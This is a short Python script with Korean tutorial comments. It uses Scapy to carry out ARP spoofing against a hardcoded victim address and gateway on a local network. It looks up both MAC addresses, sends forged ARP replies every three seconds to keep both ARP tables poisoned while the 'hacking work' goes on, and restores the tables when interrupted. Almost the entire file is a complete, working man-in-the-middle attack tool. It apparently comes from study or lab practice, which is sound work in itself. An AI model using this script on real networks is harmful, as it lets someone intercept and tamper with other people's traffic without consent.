from scapy.all import *
from time import sleep


#이더넷 환경의 LAN에서 ip에 해당하는 컴퓨터의 MAC주소를 얻는다. 해당 컴퓨터가 동작하지 않는 상태라면 MAC주소를 얻지 못한다. 
#getMAC 이 함수는 Scapy매뉴얼에 있는 그대로다.
def getMAC(ip):    
    ans, unans = srp(Ether(dst = 'ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=5, retry=3)
    for s, r in ans:
        return r.sprintf('%Ether.src%')

#Scapy모듈의 ARP()객체를 이용하여 ARP 패킷을 구성하고 Scapy모듈의 send()로 ARP패킷을 전송한다.
def poisonARP(srcip, targetip, targetmac):
    arp = ARP(op=2, psrc=srcip, pdst=targetip, hwdst = targetmac)
    send(arp)
# == ARP()의 인자 ==
# Γ op    : ARP Request 또는 ARP Reply를 지정합니다. 이 값이 1이면 ARP Request, 2는 ARP Reply를 뜻합니다
# | psrc  : ARP 패킷을 보내는 IP주소를 지정합니다.
# | pdst  : ARP 패킷의 목적지 IP주소를 지정합니다.
# | hwsrc : ARP 패킷을 보내는 MAC주소를 지정합니다.
# ㄴhwdst : ARP 패킷의 목적지 MAC주소를 지정합니다.
# 14라인의 코드에서  hwsrc가 생략되어 있는데, 이 인자가 생략되어 있으면 ARP패킷을 보내는 컴퓨터의 MAC주소가 자동으로 hwsrc에 할당된다.

def restoreARP(victimip, gatewayip, victimmac, gatewaymac):
    arp1 = ARP(op=2, pdst= victimip, psrc=gatewayip, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc= gatewaymac)
    #arp1은 피해 컴퓨터의 ARP테이블에서 게이트웨이의 MAC주소를 원래의 것으로 복구하기 위한 ARP패킷이다.
    arp2 = ARP(op=2, pdst = gatewayip, psrc = victimip, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc= victimmac)
    #arp2는 게이트웨이의 ARP테이블에서 피해 컴퓨터의 MAC주소를 원래의 것으로 복구하기 위한 ARP패킷이다.
    #hwdst의 값으로 'ff:ff:ff:ff:ff:ff'를 설정한 것은 네트워크의 모든 호스트로 브로트캐스트 하는 것이다. 

    send(arp1, count=3)
    send(arp2, count=3)
    #각 ARP테이블을 확실하게 복구하기 위해 3번 정도 전송한다. 
    
def main():
    gatewayip ='172.21.70.1'
    victimip = '172.21.70.180'
    
    victimmac = getMAC(victimip)
    gatewaymac = getMAC(gatewayip)
    
    if victimmac == None or gatewaymac == None:
        print('Could not find MAC Address')
        return
    
    print('+++ ARP Spoofing START -> VICTIM IP [%s]' %victimip)
    print('[%s] : POISON ARP Table [%s] -> [%s]' %(victimip, gatewaymac, victimmac))
    try:
        while True:
            poisonARP(gatewayip, victimip, victimmac)
            poisonARP(victimip, gatewayip, gatewaymac)
            sleep(3)
        # 프로그램을 중지할 떄 까지 3초마다 한번씩 변조된 ARP Reply패킷을 피해컴퓨터와 게이트웨이에 보낸다.
        # 이렇게 하는 이유는 해킹 작업이 마무리될 때까지 피해 컴퓨터와 게이트웨이 ARP테이블을 변경된 상태로 지속하기 위함. 
    except KeyboardInterrupt:
        restoreARP(victimip, gatewayip, victimmac, gatewaymac)
        print('---ARP Spoofing END -> RESTORED ARP Table')

if __name__ == '__main__':
    main()
    